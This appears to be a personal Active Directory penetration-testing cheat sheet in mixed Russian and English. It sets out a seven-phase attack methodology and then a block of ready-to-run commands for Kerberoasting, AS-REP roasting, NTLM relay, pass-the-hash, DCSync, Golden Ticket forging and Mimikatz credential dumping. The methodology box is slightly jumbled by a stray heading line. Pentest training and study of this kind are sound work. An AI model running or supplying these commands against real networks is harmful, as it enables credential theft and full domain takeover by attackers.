---
id: "vui5r0ay7mmesj1aq"
title: "AD"
tags: []
isFavorite: false
order: 3
createdAt: "2026-03-06T11:07:45.362Z"
updatedAt: "2026-03-06T11:45:02.269Z"
---
 Impacket (Linux) — нужны имена пользователей

AS-REP Roasting

GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile
hashes.txt
GetNPUsers.py corp.local/user:password -request  # С аутентификацией —
найдёт всех



```bash


                  AD PENTESTING METHODOLOGY                      
                                                                 
  1. RECONNAISSANCE                                              
      DNS enumeration (зоны, записи)                         
      LDAP anonymous bind                                     
      SMB null session                                        
      Сбор имён пользователей                                
                                                                 
  2. INITIAL ACCESS                                              
      Password spraying                                       
      LLMNR/NBT-NS poisoning                                 
      Фишинг                                                  
      Веб-приложения                                          
      Публичные эксплоиты                                     
                                                                 
  3. ENUMERATION (с доменным аккаунтом)                         
      BloodHound                                              
      PowerView / ADModule                                    
      Shares enumeration                                      
      Kerberoastable/AS-REP Roastable users                  
      Delegation настройки                                    
      ACL анализ                                              
                                                                 
  4. PRIVILEGE ESCALATION                                        
Quick Reference Commands
Bash
      Kerberoasting / AS-REP Roasting                        
      ACL abuse                                               
      Delegation abuse                                        
      GPO abuse                                               
      Local privesc на скомпрометированных машинах           
      Credentials в shares/configs                            
                                                                 
  5. LATERAL MOVEMENT                                            
      Pass-the-Hash                                           
      Pass-the-Ticket                                         
      Overpass-the-Hash                                       
      PSExec / WMI / WinRM                                    
      DCOM / Scheduled Tasks                                  
                                                                 
  6. DOMAIN COMPROMISE                                           
      DCSync                                                  
      Golden Ticket                                           
      NTDS.dit dump                                           
      Full domain enumeration                                 
                                                                 
  7. PERSISTENCE (если в scope)                                 
      Golden Ticket                                           
      AdminSDHolder                                           
      DCSync права                                            
      Scheduled Tasks / Services          

```                    
шпора 2

```bash

# ENUMERATION
# 
# LDAP
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local"
ldapdomaindump -u 'corp.local\user' -p password ldap://dc01
# BloodHound
bloodhound-python -u user -p pass -d corp.local -dc dc01.corp.local -c All
# CrackMapExec
crackmapexec smb 10.10.10.0/24
crackmapexec smb dc01 -u user -p pass --users
crackmapexec smb dc01 -u user -p pass --groups
crackmapexec smb dc01 -u user -p pass --shares
# 
# ATTACKS
# 
# Kerberoasting
GetUserSPNs.py -request corp.local/user:pass -dc-ip dc01
hashcat -m 13100 hashes.txt wordlist.txt
# AS-REP Roasting
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat
hashcat -m 18200 hashes.txt wordlist.txt
# NTLM Relay
responder -I eth0 -dwP
ntlmrelayx.py -tf targets.txt -smb2support
# Pass-the-Hash
psexec.py -hashes :nthash corp.local/user@target
evil-winrm -i target -u user -H hash
# DCSync
secretsdump.py corp.local/admin:pass@dc01
# Golden Ticket
ticketer.py -nthash <krbtgt> -domain-sid S-1-5-21-xxx -domain corp.local
Administrator
# 
# POST-EXPLOITATION
# 
# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # kerberos::golden /user:Admin /domain:corp.local /sid:S-1-5-21-xxx
/krbtgt:hash /ptt
```



                                      